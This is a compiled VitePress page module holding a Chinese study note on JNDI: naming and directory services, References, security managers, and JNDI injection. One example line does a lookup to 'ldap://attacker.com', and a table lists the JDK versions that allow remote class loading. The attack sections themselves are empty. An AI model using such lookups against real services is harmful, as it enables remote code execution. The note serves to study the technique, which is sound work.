import{_ as n,c as r,J as e,m as a,a as l,V as c,o as d,E as t}from"./chunks/framework.WH0rnJL5.js";const p="/assets/1647331551948-b6806bd3-c1be-4330-9816-694f6379340a-20230120154437240.ZMIZVjs-.png",u="/assets/image-20240403203503474.ZBIrIigK.png",h="/assets/image-20240403204048677.8if9IyAY.png",x=JSON.parse('{"title":"JNDI总结","description":"","frontmatter":{},"headers":[],"relativePath":"笔记/👮🏻网络安全/Java/反序列化/Basic/JNDI总结.md","filePath":"笔记/👮🏻网络安全/Java/反序列化/Basic/JNDI总结.md"}'),_={name:"笔记/👮🏻网络安全/Java/反序列化/Basic/JNDI总结.md"},m=a("h1",{id:"jndi总结",tabindex:"-1"},[l("JNDI总结 "),a("a",{class:"header-anchor",href:"#jndi总结","aria-label":'Permalink to "JNDI总结"'},"​")],-1),b=c('<h2 id="_1-jndi" tabindex="-1">1.JNDI <a class="header-anchor" href="#_1-jndi" aria-label="Permalink to &quot;1.JNDI&quot;">​</a></h2><p><strong>Java Naming Direcorty Interface(JNDI):Java命令和目录接口</strong>：一组应用程序接口，为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定义 用户、网络、机器、对象和服务等。</p><ul><li>JNDI支持的服务： <ul><li>RMI</li><li>LDAPf</li><li>DNS</li><li>CORBA</li></ul></li></ul><p>简单来说，JNDI是一组API接口，每个对象都有一组唯一的键值对绑定，将名字和对象进行绑定，通过名字来检索指定的对象而对象可能存储在RMI、LDAP、CORBA中。</p><img src="'+p+'" alt="img"><ul><li><code>Java Naming</code><ul><li>命令服务式一种键值对的绑定，使得应用程序可以通过键名检索对应的值</li></ul></li><li><code>Java Direcotry</code><ul><li>目录服务式命令服务的自然拓展，区别在于： <ul><li>目录服务中，对象可以有属性。</li><li>命令服务中，对象没有属性。</li></ul></li><li>根据这个特性，目录服务中可以根据属性检索对象。</li></ul></li><li><code>Object Facotry</code><ul><li>Object Factory 用于将Naming Service中储存的数据转换为Java中表达的数据，如：Java中对象或者Java中的基本数据类型，每一个Service Probider可能配有多个 Object Factory</li></ul></li></ul><p>Java为了实现将Object对象存储在Naming和Direcotry服务下，提供了Naming Reference功能，对象可以通过绑定Reference存储在Naming或Direcotry服务下，在使用Reference时，可以直接将对象写入构造方法中，当被调用时，对象方法就会被触发。</p><p>重要的属性配置：</p><ul><li><code>ClassName</code><ul><li>远程加载需要使用类名</li></ul></li><li><code>ClassFactory</code><ul><li>加载class中的需要实例化类的名称</li></ul></li><li><code>ClassFactoryLocation</code><ul><li>远程加载类的地址，提供classes数据的地址也可以是，file、ftp、http等协议。</li></ul></li></ul><h2 id="_2-远程代码和安全管理器" tabindex="-1">2.远程代码和安全管理器 <a class="header-anchor" href="#_2-远程代码和安全管理器" aria-label="Permalink to &quot;2.远程代码和安全管理器&quot;">​</a></h2><h3 id="_2-1-java中的安全管理器" tabindex="-1">2.1 Java中的安全管理器 <a class="header-anchor" href="#_2-1-java中的安全管理器" aria-label="Permalink to &quot;2.1 Java中的安全管理器&quot;">​</a></h3><ul><li>Java对象分为： <ul><li><strong>远程对象</strong><ul><li>默认是不受信任的</li></ul></li><li><strong>本地对象</strong><ul><li>默认是可信任的</li></ul></li></ul></li></ul><p>当系统从远程服务器加载一个对象时，为了安全起见，JVM要限制该对象的功能(禁止对象访问本地的文件系统，这个功能在JVM中是依赖安全管理器实现的。)</p><p>如下图，JVM引入&quot;域&quot;的概念，在不同的域的部分代理来对各种需要的资源进行访问，存在于不同域的class文件就具有当前域的全部权限。</p><p><img src="'+u+'" alt="image-20240403203503474"></p><ul><li>系统域 <ul><li>专门负责与关键资源进行交互，应用域则通过系统域的部分代理来对各种需要的资源进行访问，存在于不同域的class文件就具有当前域的全部权限。</li></ul></li><li>应用域 <ul><li>通过系统域的部分代理来对各种需要的资源进行访问，存在于不同域的class文件就具有当前域的全部权限。</li></ul></li></ul><h3 id="_2-2-jndi的安全管理器" tabindex="-1">2.2 JNDI的安全管理器 <a class="header-anchor" href="#_2-2-jndi的安全管理器" aria-label="Permalink to &quot;2.2 JNDI的安全管理器&quot;">​</a></h3><p>对于加载远程对象，JNDI提供两种不同的安全控制方式。</p><p>对于<code>Naming Manager</code>来说，相对的安全管理器的规则比较宽泛，但对于<code>JNDI SPI</code>层会按照下面表格的规则进行控制。</p><p><img src="'+h+`" alt="image-20240403204048677"></p><h3 id="_2-3-jndi协议动态转换" tabindex="-1">2.3 JNDI协议动态转换 <a class="header-anchor" href="#_2-3-jndi协议动态转换" aria-label="Permalink to &quot;2.3 JNDI协议动态转换&quot;">​</a></h3><p>简单来说，不管是什么样的绑定，都可以通过ladp和rmi协议利用</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light one-dark-pro vp-code"><code><span class="line"><span>    Properties env = new Properties();</span></span>
<span class="line"><span>    env.put(Context.INITIAL_CONTEXT_FACTORY,&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);</span></span>
<span class="line"><span>    env.put(Context.PROVIDER_URL,&quot;rmi://localhost:1099&quot;);</span></span>
<span class="line"><span>    Context ctx = new InitialContext(env);</span></span>
<span class="line"><span>--------------------------------------------------------------------</span></span>
<span class="line"><span>    LocateRegistry.createRegistry(6666);</span></span>
<span class="line"><span>    System.setProperty(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);</span></span>
<span class="line"><span>    System.setProperty(Context.PROVIDER_URL, &quot;rmi://localhost:6666&quot;);</span></span>
<span class="line"><span>    InitialContext ctx = new InitialContext();</span></span></code></pre></div><p>但是我们在调用<code>lookup</code>和<code>search</code>方法的时候，还可以使用带URL动态的转换上下文环境。</p><p>举个例子：</p><p>我们将JNDI的环境已经初始化配置为RMI了，但是我们在调用<code>lookup</code>方法的时候使用<code>ctx.lookup(&quot;ldap://attacker.com:12345/ou=foo,dc=foobar,dc=com&quot;);</code></p><table><thead><tr><th>协议</th><th>JDK6</th><th>JDK7</th><th>JDK8</th><th>JDK11</th></tr></thead><tbody><tr><td>LADP</td><td>&lt;6u211</td><td>&lt;7u201</td><td>&lt;8u191</td><td>&lt;11.0.1</td></tr><tr><td>RMI</td><td>&lt;6u132</td><td>&lt;7u122</td><td>&lt;8u113</td><td>无</td></tr></tbody></table><h2 id="_3-jndi注入" tabindex="-1">3.JNDI注入 <a class="header-anchor" href="#_3-jndi注入" aria-label="Permalink to &quot;3.JNDI注入&quot;">​</a></h2><h3 id="_3-1-rmi攻击" tabindex="-1">3.1 RMI攻击 <a class="header-anchor" href="#_3-1-rmi攻击" aria-label="Permalink to &quot;3.1 RMI攻击&quot;">​</a></h3><h3 id="_3-2-ldap攻击" tabindex="-1">3.2 ldap攻击 <a class="header-anchor" href="#_3-2-ldap攻击" aria-label="Permalink to &quot;3.2 ldap攻击&quot;">​</a></h3><h2 id="_4-绕过高版本jdk" tabindex="-1">4.绕过高版本JDK <a class="header-anchor" href="#_4-绕过高版本jdk" aria-label="Permalink to &quot;4.绕过高版本JDK&quot;">​</a></h2><h2 id="贡献者" tabindex="-1">贡献者 <a class="header-anchor" href="#贡献者" aria-label="Permalink to &quot;贡献者&quot;">​</a></h2>`,32),I=a("h2",{id:"文件历史",tabindex:"-1"},[l("文件历史 "),a("a",{class:"header-anchor",href:"#文件历史","aria-label":'Permalink to "文件历史"'},"​")],-1);function J(N,g,D,q,P,f){const i=t("NolebasePageProperties"),o=t("NolebaseGitContributors"),s=t("NolebaseGitChangelog");return d(),r("div",null,[m,e(i),b,e(o),I,e(s)])}const C=n(_,[["render",J]]);export{x as __pageData,C as default};
